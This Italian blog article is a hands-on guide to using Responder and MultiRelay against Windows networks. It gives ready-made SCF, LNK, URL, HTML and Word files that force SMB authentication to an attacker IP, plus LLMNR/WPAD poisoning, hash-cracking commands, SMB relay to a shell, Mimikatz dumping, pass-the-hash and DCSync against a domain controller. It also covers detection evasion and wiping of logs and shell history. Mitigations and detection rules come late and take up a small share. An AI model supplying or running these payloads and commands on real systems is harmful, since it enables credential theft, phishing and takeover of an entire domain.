---
title: 'Responder: Manuale Pratico per Cattura Hash NTLM e SMB Authentication Attack'
slug: responder
description: 'Scopri come un attaccante può sfruttare protocolli deboli come LLMNR, NBT-NS e WPAD per rubare credenziali di rete usando Responder e MultiRelay. Una guida completa e realistica per chi fa pentesting interno o vuole capire davvero come funzionano gli attacchi alle LAN Windows.'
image: /responder.webp
draft: false
date: 2026-01-22T00:00:00.000Z
categories:
  - tools
subcategories:
  - recon
tags:
  - responder
  - mitm
---

# Responder: Manuale Pratico per Cattura Hash NTLM e SMB Authentication Attack

Responder è il tool che trasforma errori banali degli utenti in accessi privilegiati ai sistemi. In questa guida vedrai tecniche pratiche utilizzate in CTF, penetration test reali e red team operation per forzare sistemi Windows a consegnarti le loro credenziali senza che nessuno se ne accorga.

Dimentica la teoria accademica: qui impari a costringere una macchina Windows a connettersi al tuo Kali, catturare l'hash NTLM in pochi secondi, e usarlo per compromettere l'intera rete. Tecniche che funzionano oggi, su Windows 11, in ambienti enterprise reali.

## Setup Lab Pratico: Dal Nulla a Compromissione

### Ambiente di Test

**Attacker Machine (Kali Linux):**

* IP: 192.168.1.100
* Tool: Responder, John the Ripper, Hashcat

**Target Machine (Windows 10/11):**

* IP: 192.168.1.50
* User: hacker / Password123!
* Membro di: WORKGROUP (o dominio CORP.LOCAL)

**Obiettivo:** Catturare hash NTLM dell'utente senza che si accorga di nulla.

### Installazione Rapida Responder

```bash
cd /opt
sudo git clone https://github.com/lgandx/Responder.git
cd Responder
sudo python3 Responder.py -I eth0 -v
```

Sei già in ascolto. Ora devi solo far connettere la vittima a te.

## Tecnica #1: Forced SMB Connection via UNC Path

### Scenario CTF Classico

Hai accesso fisico a una macchina Windows (magari un PC in reception) oppure puoi inviare un messaggio a un utente. Vuoi che Windows si connetta automaticamente al tuo Kali e ti passi l'hash.

### Metodo 1: Barra Indirizzi Explorer

**Sulla macchina Windows vittima:**

1. Apri Windows Explorer (Win+E)
2. Nella barra indirizzi digita:
   \192.168.1.100\share
3. Premi INVIO

**Cosa succede:**

* Windows tenta di connettersi via SMB al tuo IP
* Non trova share reale, ma NON importa
* Prima ancora di verificare se lo share esiste, Windows si **autentica**
* Responder cattura l'hash durante l'autenticazione

**Output su Responder (Kali):**

```bash
[SMB] NTLMv2-SSP Client   : 192.168.1.50
[SMB] NTLMv2-SSP Username : WORKGROUP\hacker
[SMB] NTLMv2-SSP Hash     : hacker::WORKGROUP:1122334455667788:A4F2D8B9E3C7A1F6...
```

**Boom!** Hash catturato in 2 secondi.

### Metodo 2: Comando CMD/PowerShell

**Sulla vittima, da prompt:**

```cmd
dir \\192.168.1.100\test
```

Oppure:

```powershell
ls \\192.168.1.100\share
```

Risultato identico: Windows prova a connettersi, si autentica, Responder cattura.

**Variante più stealth:**

```cmd
net use \\192.168.1.100\IPC$
```

Questo comando è meno sospetto perché IPC$ è uno share amministrativo standard.

### Metodo 3: File SCF Injection (Tecnica Avanzata)

Crea un file `.scf` (Shell Command File) che forza connessione automatica quando l'utente apre una cartella.

**Crea `@stealth.scf`:**

```ini
[Shell]
Command=2
IconFile=\\192.168.1.100\share\icon.ico
[Taskbar]
Command=ToggleDesktop
```

**Come funziona:**

1. Piazzi questo file in una share SMB accessibile (es. cartella condivisa aziendale)
2. Quando un utente apre quella cartella con Explorer, Windows tenta di caricare `icon.ico`
3. Per farlo, si connette al tuo IP Kali
4. **Autentica automaticamente** senza che l'utente clicchi nulla
5. Responder cattura hash

**Deployment:**

```bash
# Sul Kali, crea il file
echo '[Shell]
Command=2  
IconFile=\\192.168.1.100\share\test.ico
[Taskbar]
Command=ToggleDesktop' > @legit.scf

# Carica su share accessibile o via USB drop
```

Ogni utente che apre quella cartella ti regala il suo hash. **Zero-click attack.**

## Tecnica #2: Poisoning LLMNR/NBT-NS Automatico

### Scenario Reale

Sei sulla rete aziendale (post-exploitation, pivot da altra macchina, o anche solo connesso come ospite Wi-Fi). Vuoi catturare hash passivamente senza interazione.

### Setup Responder Completo

```bash
cd /opt/Responder
sudo python3 Responder.py -I eth0 -wrf
```

**Parametri spiegati:**

* `-w` = abilita WPAD (Web Proxy Auto-Discovery)
* `-r` = risponde a richieste LLMNR
* `-f` = forza autenticazione NTLM sui fake server

### Trigger Automatici Comuni

**1. Utente digita male un percorso:**

```
\\filesrv\docs    →  corretto
\\filesrvv\docs   →  sbagliato → LLMNR query → Responder cattura
```

**2. Browser cerca proxy WPAD:**

```
Internet Explorer all'avvio → cerca wpad.dat → LLMNR query "wpad" → Responder risponde → cattura hash
```

**3. Chrome risolve hostname random:**

```
Chrome fa 3 query DNS random all'avvio → falliscono → LLMNR fallback → Responder intercetta
```

**4. Applicazioni cercano risorse inesistenti:**

```
Software mal configurato cerca \\printserver\queue → non esiste → LLMNR → Responder
```

### Cattura Multipla

Lascia Responder in esecuzione 30 minuti in una rete enterprise. Raccoglierai:

```bash
ls -lh logs/
-rw-r--r-- 1 root root  1.2K HTTP-NTLMv2-192.168.1.15.txt
-rw-r--r-- 1 root root  1.1K SMB-NTLMv2-SSP-192.168.1.22.txt
-rw-r--r-- 1 root root  1.3K SMB-NTLMv2-SSP-192.168.1.31.txt
-rw-r--r-- 1 root root   896 FTP-192.168.1.45.txt
-rw-r--r-- 1 root root  1.2K SMB-NTLMv2-SSP-192.168.1.50.txt
```

**5 utenti diversi**, 5 hash catturati, zero interazione.

## Tecnica #3: HTML/Office File Injection

### Attacco via Email Phishing

Crei un documento Word o HTML che forza connessione SMB quando aperto.

### File HTML Weaponizzato

**Crea `report.html`:**

```html
<!DOCTYPE html>
<html>
<head>
    <title>Q4 Report</title>
</head>
<body>
    <h1>Quarterly Sales Report</h1>
    <img src="\\192.168.1.100\share\logo.png" alt="Logo">
    <p>Loading data...</p>
</body>
</html>
```

**Cosa succede:**

1. Utente apre `report.html` con browser o doppio click
2. Browser tenta di caricare immagine da UNC path `\\192.168.1.100\share\logo.png`
3. Windows autentica per accedere allo share
4. Responder cattura hash

**Variante stealth con iframe invisibile:**

```html
<!DOCTYPE html>
<html>
<body>
    <h1>Document Preview</h1>
    <iframe src="file://192.168.1.100/share/data.txt" style="display:none;"></iframe>
</body>
</html>
```

### File Word Weaponizzato (.docx)

Inserisci immagine remota collegata:

1. Apri Word → Inserisci → Immagine → Da file
2. Nel campo filename digita: `\\192.168.1.100\share\image.jpg`
3. Word memorizza questo path nel documento
4. Salva come `Invoice.docx`

**Quando la vittima apre Invoice.docx:**

* Word tenta di caricare l'immagine remota
* Si connette via SMB al tuo IP
* Autentica automaticamente
* **Hash catturato senza click**

### PDF Weaponizzato

Anche i PDF possono forzare connessioni SMB:

```bash
# Usa metadati PDF per embedded link
exiftool -Creator='\\192.168.1.100\share' document.pdf
```

Quando Adobe Reader tenta di verificare il Creator, può triggare connessione.

## Tecnica #4: Shortcut (LNK) File Attack

### LNK Poisoning

I file `.lnk` (collegamenti Windows) possono forzare autenticazioni.

**Crea shortcut malevolo:**

1. **Con PowerShell:**

```powershell
$path = "C:\Users\Public\Documents\Important.lnk"
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($path)
$Shortcut.TargetPath = "\\192.168.1.100\share\file.txt"
$Shortcut.IconLocation = "\\192.168.1.100\share\icon.ico"
$Shortcut.Save()
```

1. **Deployment:**
   * Piazza su USB drive
   * Carica su share di rete
   * Invia via email (zippato per evitare detection)

**Quando utente:**

* Naviga nella cartella con Explorer → Windows mostra anteprima → tenta di caricare icona → autentica → hash catturato
* Doppio-click sul file → stessa cosa

**Zero click se Explorer ha preview abilitato** (default su Windows 10/11).

## Tecnica #5: URL File Injection

### File URL Weaponizzato

Crea `document.url`:

```ini
[InternetShortcut]
URL=file://192.168.1.100/share/data.txt
```

Salva come `document.url` e distribuisci.

**Quando aperto:**

1. Windows tenta di aprire il file via UNC path
2. Autentica al tuo Responder
3. Hash catturato

**Variante con icona custom:**

```ini
[InternetShortcut]
URL=http://www.google.com
IconFile=\\192.168.1.100\share\favicon.ico
IconIndex=0
```

Sembra un link a Google, ma l'icona forza connessione SMB.

## Tecnica #6: WPAD Attack in Rete Aziendale

### Forcing Browser Authentication

Molti ambienti enterprise hanno WPAD configurato male o non configurato affatto. Browser cercano automaticamente configurazione proxy.

### Attacco WPAD Completo

**Setup Responder:**

```bash
sudo python3 Responder.py -I eth0 -wFb
```

**Parametri critici:**

* `-w` = abilita rogue WPAD proxy
* `-F` = forza auth su richiesta wpad.dat
* `-b` = usa Basic Auth invece di NTLM (password in chiaro!)

**Cosa succede:**

1. Browser vittima cerca `wpad.corp.local` via DNS → fallisce
2. Fallback a LLMNR: cerca "wpad" via multicast
3. Responder risponde: "Sì, sono io WPAD!"
4. Browser: "Dammi il file wpad.dat"
5. Responder: "Prima autenticati!"
6. Browser passa credenziali utente
7. **Hash (o password chiaro con -b) catturata**

**Output Responder:**

```bash
[+] Listening for events...
[LLMNR]  Poisoned answer sent to 192.168.1.25 for name wpad
[HTTP] Sending NTLM authentication request to 192.168.1.25
[HTTP] NTLMv2 Client   : 192.168.1.25
[HTTP] NTLMv2 Username : CORP\john.doe  
[HTTP] NTLMv2 Hash     : john.doe::CORP:1122334455667788:E8D3F1A9...
```

Per approfondimenti su protocolli di rete, vedi la [guida Netcat](https://hackita.it/articoli/netcat).

## Cracking Hash: Tecniche Rapide

### Preparazione Hash File

```bash
cd /opt/Responder/logs
cat SMB-NTLMv2-SSP-*.txt > all_hashes.txt
```

### Cracking con John the Ripper

**Attacco dizionario base:**

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt all_hashes.txt
```

**Con regole per aumentare efficacia:**

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64 all_hashes.txt
```

**Attacco con wordlist custom (azienda):**

```bash
# Crea wordlist da sito aziendale
cewl -d 3 -m 6 https://targetcompany.com -w company_words.txt

# Cracka con quella wordlist
john --wordlist=company_words.txt --rules=KoreLogic all_hashes.txt
```

### Cracking con Hashcat (GPU)

Molto più veloce se hai GPU dedicata:

```bash
# Identifica tipo hash (NetNTLMv2 = 5600)
hashcat --example-hashes | grep -i ntlm

# Attacco dizionario
hashcat -m 5600 all_hashes.txt /usr/share/wordlists/rockyou.txt

# Attacco mask (password comune aziendale)
hashcat -m 5600 all_hashes.txt -a 3 ?u?l?l?l?l?d?d?d?d!
# Formato: Maiuscola + 4 minuscole + 4 numeri + !
# Esempio: Admin2024!
```

**Pattern comuni password aziendali:**

```bash
# Estate2024!
hashcat -m 5600 hash.txt -a 3 ?u?l?l?l?l?l?d?d?d?d!

# Benvenuto123
hashcat -m 5600 hash.txt -a 3 ?u?l?l?l?l?l?l?l?l?d?d?d

# Company@2024
hashcat -m 5600 hash.txt -a 3 ?u?l?l?l?l?l?l@?d?d?d?d
```

### Visualizza Password Craccate

```bash
john --show all_hashes.txt
```

**Output:**

```
hacker::WORKGROUP:...:Password123!
john.doe::CORP:...:Estate2024!
admin::CORP:...:Benvenuto@2024

3 password hashes cracked, 2 left
```

## SMB Relay Attack: Da Hash a Shell

### Verifica Target Vulnerabili

Prima di relay, verifica quali host hanno SMB signing disabilitato:

```bash
cd /opt/Responder/tools
python3 RunFinger.py -i 192.168.1.0/24
```

**Output:**

```
[+] 192.168.1.10    DC01              SMB signing: True   [Domain Controller - SKIP]
[+] 192.168.1.50    WKS-USER01        SMB signing: False  [VULNERABLE]
[+] 192.168.1.51    WKS-USER02        SMB signing: False  [VULNERABLE]
[+] 192.168.1.52    SRV-FILE01        SMB signing: True   [Protected]
```

Target: `192.168.1.50` e `192.168.1.51` sono vulnerabili.

### Configurazione Responder per Relay

Disabilita SMB e HTTP in Responder per lasciare porte a MultiRelay:

```bash
nano /opt/Responder/Responder.conf
```

**Modifica:**

```ini
[Responder Core]
SMB = Off
HTTP = Off
```

### Esecuzione Attack

**Terminal 1 - Responder:**

```bash
sudo python3 Responder.py -I eth0 -rv
```

**Terminal 2 - MultiRelay:**

```bash
cd /opt/Responder/tools
sudo python3 MultiRelay.py -t 192.168.1.50 -u ALL
```

**Cosa accade:**

1. Vittima (192.168.1.25) digita `\\filesrvv\docs` (typo)
2. LLMNR query → Responder cattura
3. Vittima si connette a Responder credendo sia filesrvv
4. **Invece di loggare solo hash**, MultiRelay lo usa per autenticarsi a 192.168.1.50
5. Se l'utente è admin su 192.168.1.50 → **SHELL!**

**Output MultiRelay:**

```bash
[+] Received NTLMv2 from 192.168.1.25 (CORP\admin)
[+] Relaying credentials to 192.168.1.50
[+] SMB Session established on 192.168.1.50
[+] Administrative access confirmed!
[+] Dropping into shell...

Microsoft Windows [Version 10.0.19045]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
corp\admin

C:\Windows\system32>hostname  
WKS-USER01

C:\Windows\system32>net user
User accounts for \\WKS-USER01

admin                    guest                    DefaultAccount
...
```

**Hai shell su macchina remota senza sapere password!**

Per tecniche SMB avanzate, consulta la [guida smbclient](https://hackita.it/articoli/smbclient).

## Privilege Escalation: Da User a Domain Admin

### Scenario Post-Shell

Hai shell su `WKS-USER01` come `CORP\admin` (admin locale, NON domain admin).

### Dumping Credentials in Memoria

**Opzione 1 - Mimikatz via MultiRelay:**

```bash
C:\Windows\system32> mimi
```

Responder esegue Mimikatz embedded:

```
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 234567
User Name         : john.doe
Domain            : CORP
NTLM              : 8c5d91e2f42ab3c5d76f9a1e4b2c8d3f

Authentication Id : 0 ; 123456  
User Name         : DA_Admin
Domain            : CORP
NTLM              : a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6
```

**Boom!** Trovato `DA_Admin` (Domain Admin) loggato su questa workstation.

### Pass-the-Hash Lateral Movement

Ora hai hash di Domain Admin. Usa per autenticarti al Domain Controller:

```bash
# Su Kali, usa hash per exec comandi su DC
impacket-psexec -hashes :a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6 CORP/DA_Admin@192.168.1.10
```

**Output:**

```bash
Impacket v0.11.0 - Copyright 2023

[*] Requesting shares on 192.168.1.10.....
[*] Found writable share ADMIN$
[*] Uploading file...
[*] Opening SVCManager on 192.168.1.10.....
[*] Starting service...

Microsoft Windows [Version 10.0.20348.1906]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
corp\da_admin

C:\Windows\system32>hostname
DC01
```

**Sei Domain Admin sul DC. Game Over. Rete compromessa.**

### DCSync Attack

Dumpa tutti gli hash del dominio:

```bash
# Su Kali con credenziali DA
impacket-secretsdump CORP/DA_Admin@192.168.1.10 -hashes :a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6
```

**Output:**

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c34d55a5f6e4c8b2a1d8f3e7c5a9d2:::
john.doe:1104:aad3b435b51404eeaad3b435b51404ee:8c5d91e2f42ab3c5d76f9a1e4b2c8d3f:::
DA_Admin:1105:aad3b435b51404eeaad3b435b51404ee:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6:::
...
```

**Hai TUTTI gli hash del dominio.** Accesso completo a ogni account.

## Tecniche Stealth e Anti-Detection

### Modalità Analyze (Passive)

Prima di attaccare, osserva la rete passivamente:

```bash
sudo python3 Responder.py -I eth0 -A
```

Parametro `-A` disabilita risposte. Solo monitoring.

**Cosa osservare:**

* Quali host fanno più richieste LLMNR/NBT-NS
* Quali nomi vengono cercati (errori comuni)
* Presenza di richieste WPAD
* Orari di picco attività

**Log analysis:**

```bash
cat /opt/Responder/logs/Analyze* | grep "Name:" | sort | uniq -c | sort -rn
```

**Output:**

```
  47 Name: filesrv
  23 Name: wpad  
  12 Name: printserver
   8 Name: backup
```

`filesrv` è cercato 47 volte → target perfetto per typo poisoning.

### Limitare Scope di Poisoning

Rispondi solo a nomi specifici per ridurre noise:

```bash
# Modifica Responder.conf
[Responder Core]
# Rispondi solo a questi nomi
RespondTo = filesrv,wpad,printserver
```

Ora Responder risponde solo a query per quei 3 nomi, ignorando tutto il resto.

### Timing Attack

Attiva Responder solo in finestre temporali:

```bash
# Attiva alle 9:00 (inizio giornata lavorativa)
echo "0 9 * * 1-5 cd /opt/Responder && python3 Responder.py -I eth0 -wrf > /dev/null 2>&1" | crontab -

# Disattiva alle 18:00
echo "0 18 * * 1-5 pkill -f Responder.py" | crontab -a
```

Catturi hash durante orario lavorativo quando c'è più attività, riduci esposizione.

## Defense Evasion: Bypassare Rilevamenti

### Cambiare Challenge Response

Responder usa challenge predefinito `1122334455667788`. Cambialo:

```bash
nano /opt/Responder/Responder.conf
```

**Modifica:**

```ini
[Responder Core]
Challenge = AABBCCDDEEFF0011
```

Alcuni IDS cercano il challenge di default.

### Cambiare Hostname Fake Server

```bash
# Modifica Responder.conf
[Responder Core]
; Invece di nome random, usa nome legittimo
NetbiosDomain = CORP
NetbiosName = FILESRV-02
```

Il tuo fake server si presenta come `FILESRV-02.CORP` → sembra legittimo.

### Log Cleanup

```bash
# Cancella log dopo ogni sessione
cd /opt/Responder/logs
shred -vfz -n 10 *.txt
rm Responder.db

# Cancella bash history
history -c
cat /dev/null > ~/.bash_history
```

## Mitigazioni: Come Difendersi

### Disabilitazione Protocolli Vulnerabili

**LLMNR - Via GPO:**

```
gpedit.msc
→ Computer Configuration  
→ Administrative Templates
→ Network
→ DNS Client
→ Turn OFF Multicast Name Resolution = ENABLED
```

**NBT-NS - Via PowerShell (All Adapters):**

```powershell
Get-WmiObject Win32_NetworkAdapterConfiguration -Filter "IPEnabled=True" | ForEach-Object {
    $_.SetTcpipNetbios(2)  # 2 = Disable
}
```

**NBT-NS - Via GPO Startup Script:**

Crea `C:\Scripts\DisableNBTNS.ps1`:

```powershell
$regkey = "HKLM:\SYSTEM\CurrentControlSet\Services\NetBT\Parameters\Interfaces"
Get-ChildItem $regkey | ForEach-Object {
    Set-ItemProperty -Path "$regkey\$($_.PSChildName)" -Name NetbiosOptions -Value 2 -Force
}
```

Deploy via:

```
gpedit.msc
→ Computer Configuration
→ Windows Settings  
→ Scripts
→ Startup
→ Add → DisableNBTNS.ps1
```

### Abilitazione SMB Signing (CRITICO)

**Via GPO:**

```
gpedit.msc
→ Computer Configuration
→ Windows Settings
→ Security Settings
→ Local Policies
→ Security Options

Enable BOTH:
- Microsoft network client: Digitally sign communications (always)
- Microsoft network server: Digitally sign communications (always)
```

**Verifica applicazione:**

```powershell
Get-SmbServerConfiguration | Select EnableSecuritySignature,RequireSecuritySignature
```

**Output atteso:**

```
EnableSecuritySignature RequireSecuritySignature
----------------------- -------------------------
                   True                      True
```

### Network Segmentation

```
VLAN 10 - Domain Controllers
  ↓ Isolated, SMB Signing REQUIRED
VLAN 20 - Servers (File/Print)
  ↓ SMB Signing REQUIRED
VLAN 30 - Workstations
  ↓ SMB Signing REQUIRED, LLMNR/NBT-NS DISABLED
VLAN 40 - Guest/IoT
  ↓ No SMB access
```

Firewall rules tra VLAN:

```
DENY VLAN 30 → VLAN 10 (Workstation → DC) eccetto porte autorizzate
DENY VLAN 40 → ALL (Guest isolated)
```

### Monitoring e Detection

**Sysmon Rules per Responder:**

```xml
<Sysmon schemaversion="4.82">
  <EventFiltering>
    <NetworkConnect onmatch="include">
      <DestinationPort condition="is">5355</DestinationPort>
      <DestinationPort condition="is">137</DestinationPort>
    </NetworkConnect>
  </EventFiltering>
</Sysmon>
```

**Splunk Detection:**

```spl
index=network sourcetype=firewall dest_port IN (137,5355,5353)
| stats count by src_ip dest_ip
| where count > 50
| table src_ip count
```

**Sigma Rule:**

```yaml
title: Responder LLMNR/NBT-NS Poisoning
status: experimental
logsource:
    product: windows
    service: sysmon
detection:
    selection:
        EventID: 3
        DestinationPort:
            - 5355
            - 137
            - 5353
    condition: selection
```

## Tabella Tattiche Operative

| Tecnica               | Trigger               | Interazione Richiesta   | Stealth Level | Efficacia |
| --------------------- | --------------------- | ----------------------- | ------------- | --------- |
| UNC Path in Explorer  | `\\attacker_ip\share` | User digita manualmente | Basso         | 100%      |
| SCF File Injection    | User apre cartella    | Zero-click              | Alto          | 95%       |
| LNK Poisoning         | User naviga cartella  | Zero-click (preview)    | Alto          | 90%       |
| HTML IMG Tag          | User apre HTML        | Zero-click              | Medio         | 85%       |
| LLMNR Poisoning       | User typo share name  | Zero (attesa passiva)   | Altissimo     | 70%       |
| WPAD Attack           | Browser avvio         | Zero                    | Alto          | 60%       |
| Office Doc Remote IMG | User apre documento   | Zero-click              | Medio         | 80%       |
| URL File              | User apre .url file   | Single-click            | Medio         | 75%       |

## Checklist Engagement

**Pre-Attack:**

* Setup Kali con Responder aggiornato
* Verificato IP attacker raggiungibile da target
* Configurato logging completo (`-v`)
* Testato connettività SMB con test innocuo
* Preparato file weaponizzati (SCF, LNK, HTML)

**During Attack:**

* Responder in ascolto su interfaccia corretta
* Monitoraggio attivo log in real-time: `tail -f logs/*.txt`
* Documentato ogni hash catturato (timestamp, IP, username)
* Verificato SMB signing su target prima di relay
* Testato hash catturati con cracking rapido

**Post-Exploitation:**

* Copiato tutti log in storage sicuro
* Tentato lateral movement con hash catturati
* Escalation a Domain Admin se possibile
* Documentato catena di attacco completa
* Cleanup: terminato Responder, cancellato tracce

**Reporting:**

* Lista completa credenziali compromesse
* Screenshot capture hash
* Evidence SMB relay riuscito
* Raccomandazioni prioritizzate
* Timeline attacco per cliente

## FAQ Pratiche CTF

**Responder non cattura hash quando digito \ip\share - perché?**

Verifica:

1. Firewall Kali blocca porte 445/137/5355: `sudo ufw status`
2. Responder effettivamente in ascolto: `sudo netstat -tulpn | grep python`
3. IP Kali raggiungibile da Windows: `ping 192.168.1.100`
4. Windows Firewall blocca SMB outbound (raro ma possibile)

**Come forzo connessione SMB senza accesso fisico a Windows?**

* Email con HTML weaponizzato (img tag UNC path)
* File SCF su share già compromessa
* Social engineering: "Apri questo documento importante.docx"
* Phishing con URL file attachment

**MultiRelay non funziona - errore libreria Crypto**

```bash
# Fix su Kali
pip3 install pycryptodome
# oppure
pip3 install pycrypto
```

Se persiste, usa Impacket ntlmrelayx invece di MultiRelay:

```bash
impacket-ntlmrelayx -tf targets.txt -smb2support
```

**Posso catturare hash su rete WiFi pubblica (Futuro Ufficio Hackita.it?)?**

Tecnicamente sì se:

* Client isolation disabilitata
* Sei su stessa subnet delle vittime
* Router permette multicast/broadcast

Ma è **illegale** senza autorizzazione. Solo su reti di test.

***P.S aiutaci a creare il nostro ufficio con una donzione cliccando [qui.](https://hackita.it/supporto)***

**L'hash catturato non cracca - alternative?**

1. **Pass-the-Hash**: Usa direttamente con `impacket-psexec`
2. **SMB Relay**: Se hai altri target vulnerabili
3. **Rainbow Tables**: Se password semplice ma non in wordlist
4. **Kerberoasting**: Se in dominio AD, attacca service account invece

**Responder triggera alert antivirus?**

Responder script Python raramente. Ma:

* Fake server SMB/HTTP può triggerare EDR behavioral detection
* Poisoning multicast visibile a IDS/IPS avanzati
* Log Windows Event 4648 (explicit credentials) aumentano

**Mitigazione**: Usa `-A` (analyze) per reconnaissance passiva prima.

**Quanto tempo lasciare Responder attivo in pentest autorizzato?**

* Small office (10-50 PC): 2-4 ore
* Medium enterprise (100-500 PC): 8-24 ore
* Large corp (1000+ PC): 24-72 ore

Di solito primi hash arrivano in 15-30 minuti in rete attiva.

***

**Repository e Risorse:**

* [Responder GitHub Ufficiale](https://github.com/lgandx/Responder)
* [Impacket per Pass-the-Hash](https://github.com/SecureAuthCorp/impacket)
* [Guida Netcat Network Tools](https://hackita.it/articoli/netcat)
* [SMBClient Enumeration Guide](https://hackita.it/articoli/smbclient)

**Disclaimer Legale:** Tutte le tecniche descritte sono esclusivamente per scopi educativi e penetration testing autorizzato. L'utilizzo di Responder su reti non di proprietà senza esplicito consenso scritto costituisce reato penale in tutte le giurisdizioni. Ottieni sempre autorizzazione formale documentata prima di qualsiasi test di sicurezza.
